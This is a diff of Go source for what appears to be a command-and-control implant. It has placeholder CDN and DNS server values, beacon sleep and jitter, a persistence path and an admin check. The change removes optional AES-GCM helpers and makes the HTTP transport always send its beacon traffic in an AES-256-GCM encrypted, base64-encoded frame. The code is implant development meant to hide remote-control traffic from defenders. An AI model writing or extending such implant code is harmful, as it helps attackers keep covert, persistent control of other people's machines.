@@ -9,10 +9,7 @@ package main
 
 import (
 	"bytes"
-	"crypto/aes"
-	"crypto/cipher"
 	"crypto/rand"
-	"crypto/sha256"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -48,7 +45,6 @@ var (
 	CDNURL      = "REPLACE_CDN_URL______XXXXXXXXXXXXXXXXXXXXXXXX"
 	DNSServer   = "REPLACE_DNS_SERVER___XXXXXXXXXXXXXXXXXXXXXXXX"
 
-	aesKey       []byte
 	sleepTime    = 5
 	jitterTime   = 3
 	clientID     int64
@@ -86,10 +82,6 @@ func init() {
 				break
 			}
 		}
-	}
-	if EncryptSalt != "" && len(EncryptSalt) > 5 {
-		h := sha256.Sum256([]byte(EncryptSalt + ":" + VerifyKey))
-		aesKey = h[:]
 	}
 
 	// Default persistence path
@@ -169,51 +161,6 @@ func isWindowsAdmin() bool {
 }
 
 // ============================================================================
-// AES Encryption
-// AES 加密
-// ============================================================================
-
-// encrypt 使用派生密钥加密数据。
-// encrypt encrypts data with the derived AES key.
-func encrypt(plaintext []byte) ([]byte, error) {
-	if aesKey == nil {
-		return plaintext, nil
-	}
-	block, err := aes.NewCipher(aesKey)
-	if err != nil {
-		return nil, err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	nonce := make([]byte, gcm.NonceSize())
-	rand.Read(nonce)
-	return gcm.Seal(nonce, nonce, plaintext, nil), nil
-}
-
-// decrypt 使用派生密钥解密数据。
-// decrypt decrypts data with the derived AES key.
-func decrypt(ciphertext []byte) ([]byte, error) {
-	if aesKey == nil {
-		return ciphertext, nil
-	}
-	block, err := aes.NewCipher(aesKey)
-	if err != nil {
-		return nil, err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	ns := gcm.NonceSize()
-	if len(ciphertext) < ns {
-		return nil, fmt.Errorf("ciphertext too short")
-	}
-	return gcm.Open(nil, ciphertext[:ns], ciphertext[ns:], nil)
-}
-
-// ============================================================================
 // Transport interface and implementations
 // 传输接口与实现
 // ============================================================================
@@ -245,13 +192,13 @@ func newHTTPTransport(url string) *httpTransport {
 }
 
 // postJSON 向服务器发送 JSON 请求。
-// postJSON sends a JSON request to the server.
+// 消息体经 AES-256-GCM 帧加密（与 TCP/KCP 统一格式，服务器对所有入站
+// 帧 GCM Open），base64 编码放入 HTTP body。
+// postJSON sends a JSON request to the server. The body is wrapped in the
+// AES-256-GCM message frame (same key/format as TCP/KCP), base64-encoded.
 func (t *httpTransport) postJSON(path string, data []byte) (*http.Response, error) {
-	body := data
-	if aesKey != nil {
-		enc, _ := encrypt(data)
-		body = []byte(base64.StdEncoding.EncodeToString(enc))
-	}
+	enc := encryptFrame(data)
+	body := []byte(base64.StdEncoding.EncodeToString(enc))
 	return t.client.Post(t.serverURL+path, "application/json", bytes.NewReader(body))
 }
 
